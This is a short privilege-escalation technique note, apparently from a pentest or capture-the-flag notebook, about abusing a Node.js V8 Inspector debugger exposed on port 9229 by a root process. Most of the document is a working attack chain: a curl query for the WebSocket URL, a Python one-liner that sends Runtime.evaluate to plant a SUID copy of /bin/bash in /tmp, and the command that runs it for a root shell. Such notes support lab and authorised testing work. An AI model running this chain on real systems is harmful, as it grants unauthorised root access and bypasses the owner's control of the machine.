# Node.js Inspector / WebSocket Debugger Abuse

Used on: **Reactor**

If a Node.js process is running as root with the `--inspect` flag enabled, the V8 Inspector is listening via WebSocket (typically on port 9229). If this port is accessible locally (or remotely), an attacker can connect and execute arbitrary JavaScript within the context of the running application.

## Prerequisites
- Local access to the target machine (or remote access to the debugger port).
- The debugger port is open (e.g. `127.0.0.1:9229`).

## Execution

### 1. Get the WebSocket URL
Request the `/json` endpoint of the inspector to retrieve the `webSocketDebuggerUrl`.

<!-- cmd: linux -->
```bash
curl -s http://127.0.0.1:9229/json
```
Response:
<!-- cmd: http -->
```json
[{
  "id": "0e8809c7-fc0e-426d-9e16-0e9dff19842a",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/0e8809c7-fc0e-426d-9e16-0e9dff19842a",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node"
}]
```

### 2. Execute Code via WebSocket
Connect to the `webSocketDebuggerUrl` and use the `Runtime.evaluate` method to execute commands, like making a `/bin/bash` copy with SUID permissions.

<!-- cmd: linux -->
```bash
python3 -c "
import websocket, json
ws = websocket.create_connection('ws://127.0.0.1:9229/0e8809c7-fc0e-426d-9e16-0e9dff19842a')
payload = {
    'id': 1,
    'method': 'Runtime.evaluate',
    'params': {
        'expression': 'process.mainModule.require(\"child_process\").execSync(\"cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash\").toString()'
    }
}
ws.send(json.dumps(payload))
print(ws.recv())
ws.close()
"
```

### 3. Obtain Root Shell
Execute the dropped SUID binary.

<!-- cmd: linux -->
```bash
/tmp/rootbash -p
```
